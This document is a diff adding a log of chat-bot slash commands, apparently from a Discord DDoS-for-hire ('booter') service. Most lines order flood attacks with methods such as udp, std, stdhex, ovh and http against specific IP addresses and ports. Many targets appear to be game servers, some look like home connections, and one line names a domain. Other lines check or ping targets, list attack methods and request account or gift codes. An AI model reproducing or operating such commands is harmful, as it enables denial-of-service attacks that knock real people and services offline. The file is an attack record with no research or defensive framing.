@@ -1,0 +1,184 @@
+/cmds
+/cmds
+/tr4p
+/methods
+/ddos syn 128.116.66.83 60 dport=65451
+/checkip 217.39.204.164
+/ddos std 128.116.66.83 60 dport=65451
+/info
+/ddos udp 128.116.14.140 60 dport=49511
+/plan
+/ddos udp 128.116.25.11 120 dport=52424
+/ddos udp 128.116.25.11 120 dport=52424
+/ddos udp 128.116.27.200 35 dport=64793
+/ddos udp 128.116.25.100 120 dport=58593
+/ddos std 128.116.54.22 120 dport=60849
+/ddos udp 128.116.66.212 120 dport=57441
+/ddos udp 128.116.3.30 30 dport=57441
+/tr4p
+/checkip 82.2.41.163
+/ddos udp 128.116.66.212 10 dport=80
+/ddos std 82.2.41.163 30
+/methods
+/ddos std 128.116.14.140 120 dport=49511
+/ddos stomp 128.116.7.87 120 dport=60225
+/ddos ovh 128.116.29.15 120 dport=61163
+/ddos std 128.116.29.15 120 dport=61163
+/ddos std 128.116.29.80 300 dport=53716
+/ddos std 128.116.14.140 150 dport=49511
+/ddos std 128.116.3.30 150 dport=63846
+/ddos std 128.116.3.30 50 dport=63846
+/ddos std 128.116.65.219 120 dport=49356
+/ddos udp 128.116.65.219 60 dport=49356
+/ddos std 128.116.56.199 70 dport=61698
+/ddos std 128.116.56.199 50 dport=61698
+/ddos std 128.116.30.203 50 dport=62526
+/ddos std 128.116.16.158 40 dport=58775
+/accounts
+/xboxcode
+/xboxcode
+/xboxcode
+/mega
+/tr4p
+/checkip 194.171.186.129
+/checkip LEERParkmvi.nl
+/checkip 84.241.177.150
+/ddos http 84.241.177.150 60 domain=introweb.nl conns=5000
+/ddos udp 194.171.186.129 60 dport=80
+/accounts
+/vpn
+/vpn
+/ddos udp 194.171.186.129 200 dport=80
+/ping 194.171.186.129
+/checkip 77.250.179.250
+/checkip 172.107.255.94
+/checkip 162.159.133.234
+/ddos std 128.116.21.27 120 dport=59483
+/checkip 167.71.225.181
+/ddos udp 77.250.179.250 10 dport=80
+/checkip 188.122.86.15
+/checkip 192.168.178.13
+/checkip 216.58.208.99
+/checkip 62.195.234.116
+/ddos 62.195.234.116 30 dport=80
+/ddos udp 109.37.131.161 20 dport=80
+/ddos stdhex 128.116.3.77 120 dport=59507
+/ddos stdhex 128.116.3.12 120 dport=64885
+/ddos stdhex 128.116.52.23 120 dport=51602
+/ddos stdhex 128.116.50.14 50 dport=55930
+/ddos stdhex 128.116.50.14 50 dport=55930
+/ddos stdhex 128.116.50.14 500 dport=55930
+/ddos stdhex 128.116.60.140 20 dport=64652
+/ddos stdhex 128.116.56.89 200 dport=50298
+/ddos stdhex 128.116.3.226 50 dport=62196
+/ddos stdhex 128.116.3.226 100 dport=62196
+/methods
+/ddos vse 128.116.3.226 40 dport=62196
+/ddos stdhex 128.116.52.33 300 dport=61535
+/ddos stdhex 128.116.21.37 200 dport=53303
+/ddos stdhex 128.116.21.37 200 dport=53303
+/ddos stdhex 128.116.21.37 100 dport=53303
+/methods
+/ddos ack 128.116.60.140 80 dport=64652
+/ddos stdhex 128.116.60.140 80 dport=64652
+/methods
+/ddos greeth 128.116.39.36 30 dport=65034
+/ddos dns 128.116.64.19 50 dport=53051
+/ddos std 128.116.64.19 50 dport=53051
+/ddos stdhex 128.116.64.19 50 dport=53051
+/ddos udpplain 128.116.64.19 50 dport=53051
+/ddos udp 128.116.64.19 50 dport=53051
+/ddos stdhex 128.116.8.25 80 dport=64612
+/methods
+/status
+/checkip 77.163.99.137
+/methods
+/ddos udp 77.163.99.137 100 dport=80
+/ping 77.163.99.137
+/ddos udp 77.163.99.137 30 dport=80
+/ddos udp 77.163.99.137 50 dport=80
+/methods
+/ddos udpplain 128.116.64.220 50 dport=55888
+/ddos tcp 128.116.64.220 50 dport=55888
+/ddos vse 128.116.64.220 50 dport=55888
+/ddos udprand 128.116.64.220 50 dport=55888
+/checkip 89.39.107.201
+/ddos stdhex 128.116.63.28 120 dport=54518
+/ddos stdhex 128.116.2.149 120 dport=62608
+/lag
+/checkip 99.72.27.26
+/lag udp 128.116.65.16 0 80 12 dport=62869
+/ddos stdhex 128.116.25.139 50 dport=63478
+/ddos stdhex 128.116.0.28 120 dport=54687
+/ddos stdhex 128.116.61.79 120 dport=64711
+/accounts
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/ddos udp 77.163.99.137 40 dport=80
+/ddos stdhex 128.116.60.94 50 dport=62255
+/ddosstop
+/ddos udp 18.130.201.177 120 dport=9020
+/ddos udp 172.67.195.70 20 dport=25565
+/ddos std  172.67.195.70 120 dport=80
+/ddos std 104.27.191.128 120 dport=80
+/ddos std 178.21.19.234 20 dport=80
+/ddos std 178.21.19.234 15 dport=80
+/ddos stdhex 178.21.19.234 40 dport=80
+/ddos stdhex 178.21.19.234 100 dport=25610
+/ddos stdhex 178.21.19.234 120 dport=25610
+/ddos stdhex 13.248.197.95 120 dport=7133
+/ddos std 87.209.226.131 20 dport=80
+/ddos stdhex 87.209.226.131 20 dport=80
+/ddos stdhex 128.116.65.227 100 dport=57151
+/ddos http 172.67.158.105 120 conns=5000
+/tr4p
+/ddos stdhex 128.116.3.166 120 dport=50119
+/ddos std 128.116.3.166 120 dport=5011
+/methods
+/ddos mstdhex 128.116.3.166 120 dport=5011
+/ddos udp 87.209.226.131 120 dport=80
+/ddos std 87.209.226.131 120
+/ping 87.209.226.131
+/ddos udp 87.209.226.131 15
+/ping 87.209.226.131
+/ping 87.209.226.131
+/ddos std 77.250.179.250 40
+/ddos udp 77.250.179.250 35
+/ddos stdhex 194.171.186.129 1200
+/ping 194.171.186.129
+/ddos udp194.171.186.129 1200 dport=80 conns=5000
+/ddos udp194.171.186.129 1200 dport=80 conns=5000
+/ddos udp 194.171.186.129 1200 dport=80 conns=5000
+/getplan <@409496215135191043>
+/ddos udp 77.250.179.250 120
+/ddos udp 77.250.179.250 120
+/ddos udp 77.250.179.250 120
+/ddos udp 77.250.179.250 1200
+/ddos udp 74.96.242.58 1200 dport=80
+/ping 74.96.242.58
+/ddos udp 3.9.146.35 120 dport=9040
+/getplan
+/getplan <@226455931376893963>
+/ddos std 128.116.75.174 25
+/ddos stdhex 128.116.46.161 1200 dport=52330
+/ddos stdhex 77.163.99.137 30 dport=80
+/ddos stdhex 77.163.99.137 1200 dport=80
+/ddos stdhex 77.250.179.250 35 80
+/ddos stdhex 77.250.179.250 35 80
+/ddos stdhex 194.125.251.183 60 dport=10994
+/ddos stdhex 185.116.156.172 60 dport=25565
+/ddos stdhex 77.250.179.250 1200 dport=80
+/ping 77.250.179.250
+/tr4p
+/ping 77.250.179.250
+/ping 77.250.179.250
+/ddos stdhex 87.209.226.131 30 dport=80
+/methods
+/ddos squid 128.116.65.228 120 dport=59313
